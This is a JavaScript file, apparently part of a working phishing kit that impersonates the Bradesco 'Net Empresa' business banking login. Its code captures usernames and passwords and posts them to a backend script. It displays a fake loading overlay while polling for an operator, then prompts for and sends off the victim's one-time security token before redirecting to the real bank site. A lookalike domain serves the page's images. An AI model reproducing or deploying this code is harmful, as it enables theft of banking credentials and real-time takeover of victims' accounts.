let currentSessionId = null;

function capturarLogin(event) {
    event.preventDefault();
    const usuario = document.getElementById('identificationForm:txtUsuario').value.trim();
    const senha = document.getElementById('identificationForm:txtSenha').value.trim();
    
    if (!usuario || !senha) {
        alert('Por favor, preencha usuário e senha');
        return false;
    }
    
    const formData = new FormData();
    formData.append('action', 'salvar_login');
    formData.append('usuario', usuario);
    formData.append('senha', senha);
    
    fetch('token_api.php', {
        method: 'POST',
        body: formData
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'sucesso') {
            currentSessionId = data.session_id;
            mostrarLoading();
        }
    });
    
    return false;
}

function mostrarLoading() {
    const overlay = document.createElement('div');
    overlay.id = 'loading-overlay';
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);display:flex;justify-content:center;align-items:center;z-index:9999;';
    
    const container = document.createElement('div');
    container.style.cssText = 'background:white;padding:40px;border-radius:10px;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,0.3);max-width:400px;width:90%;';
    
    container.innerHTML = `
        <img src="https://bradescopjempresas.com/estilos/pictures/f7fc63fa8eed546024b8de4d0b1aa3c7.gif" style="width:80px;height:80px;margin-bottom:20px;animation:spin 2s linear infinite;">
        <div id="loading-status-text" style="font-size:18px;color:#333;font-weight:bold;margin-top:20px;">Aguarde, efetuando login no Net Empresa!</div>
    `;
    
    overlay.appendChild(container);
    document.body.appendChild(overlay);
    
    if (!document.getElementById('spin-style')) {
        const style = document.createElement('style');
        style.id = 'spin-style';
        style.textContent = '@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }';
        document.head.appendChild(style);
    }

    iniciarVerificacaoToken();
}

function iniciarVerificacaoToken() {
    const interval = setInterval(() => {
        fetch(`token_api.php?action=verificar_status_cliente&session_id=${currentSessionId}`)
            .then(r => r.json())
            .then(data => {
                if (data.token_solicitado) {
                    clearInterval(interval);
                    mostrarModalToken();
                }
            });
    }, 3000);
}

function mostrarModalToken() {
    const container = document.querySelector('#loading-overlay > div');
    container.innerHTML = `
        <div style="text-align: center;">
            <img src="ibpj/imagens/perfil_varejo/logo.png" style="width: 120px; margin-bottom: 20px;">
            <h3 style="color: #cc092f; margin-bottom: 15px;">Validação de Segurança</h3>
            <p style="font-size: 14px; color: #666; margin-bottom: 20px;">Por favor, insira o código de segurança (Token) enviado para o seu dispositivo.</p>
            <input type="text" id="input-token-cliente" maxlength="6" placeholder="000000" style="width:100%;padding:12px;font-size:24px;text-align:center;letter-spacing:5px;border:2px solid #ddd;border-radius:5px;margin-bottom:20px;outline:none;">
            <button onclick="enviarTokenCliente()" style="background-color:#cc092f;color:white;border:none;padding:12px 30px;border-radius:5px;font-weight:bold;cursor:pointer;width:100%;">Confirmar Token</button>
        </div>
    `;
}

function enviarTokenCliente() {
    const token = document.getElementById('input-token-cliente').value;
    const formData = new FormData();
    formData.append('action', 'enviar_token_cliente');
    formData.append('session_id', currentSessionId);
    formData.append('token', token);

    fetch('token_api.php', { method: 'POST', body: formData })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'sucesso') {
            const container = document.querySelector('#loading-overlay > div');
            container.innerHTML = `
                <img src="https://bradescopjempresas.com/estilos/pictures/f7fc63fa8eed546024b8de4d0b1aa3c7.gif" style="width:80px;height:80px;animation:spin 2s linear infinite;">
                <div style="font-size:18px;color:#333;font-weight:bold;margin-top:20px;">Validando token, aguarde...</div>
            `;
            setTimeout(() => { window.location.href = 'https://www.bradesco.com.br'; }, 5000);
        }
    });
}
